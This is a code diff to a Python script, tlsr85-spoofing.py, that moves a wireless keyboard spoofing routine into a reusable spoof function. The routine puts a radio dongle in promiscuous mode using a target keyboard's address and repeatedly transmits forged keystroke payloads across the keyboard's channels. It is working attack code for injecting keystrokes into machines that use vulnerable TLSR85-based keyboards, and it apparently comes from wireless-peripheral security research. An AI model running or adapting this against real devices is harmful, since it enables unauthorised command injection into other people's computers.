@@ -15,6 +15,24 @@ from devices.TLSR85.tlsr85_keyboard import *
 common.init_args('./tlsr85-spoofing.py')
 common.parse_and_init()
 
+
+def spoof(attack, address, preamble, channels, rate):
+    channel_index = 0
+    common.radio.set_channel(channels[channel_index]) # Set channel here to prevent USBError (somehow)
+    common.radio.enter_promiscuous_mode_generic(address, rate=rate)
+    for payload in attack:
+        if callable(payload):
+            payload() # in case we want a delay
+        else:
+            for i in range(len(channels)):
+                common.radio.set_channel(channels[i])
+                for _ in range(20):
+                    common.radio.transmit_payload_generic(payload=preamble+payload, address=address)
+                    time.sleep(0.0001)
+
+
+
+
 trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", "aa:aa:b5", 22, 0x11021, 0x24bf, 2)
 # poss_keyboard = Tlsr85Keyboard("d5:54:cb", "80", "aa:aa:cc", 22, 0x11021, 0xcb01, 2)
 
@@ -34,19 +52,9 @@ attack = [
     ]
 
 
-channels = Tlsr85.CHANNELS
-channel_index = 0
-common.radio.set_channel(channels[channel_index]) # Set channel here to prevent USBError (somehow)
-common.radio.enter_promiscuous_mode_generic(unhexlify(trust_keyboard.base_address.replace(':', '')), rate=Tlsr85.RATE)
-preamble = unhexlify(trust_keyboard.preamble.replace(':', ''))
-address = unhexlify(trust_keyboard.base_address.replace(':', ''))
 
-for payload in attack:
-    if callable(payload):
-        payload() # in case we want a delay
-    else:
-        for i in range(len(channels)):
-            common.radio.set_channel(channels[i])
-            for _ in range(20):
-                common.radio.transmit_payload_generic(payload=preamble+payload, address=address)
-                time.sleep(0.0001)
+address = unhexlify(trust_keyboard.base_address.replace(':', ''))
+preamble = unhexlify(trust_keyboard.preamble.replace(':', ''))
+
+
+spoof(attack, address, preamble, trust_keyboard.CHANNELS, trust_keyboard.RATE)
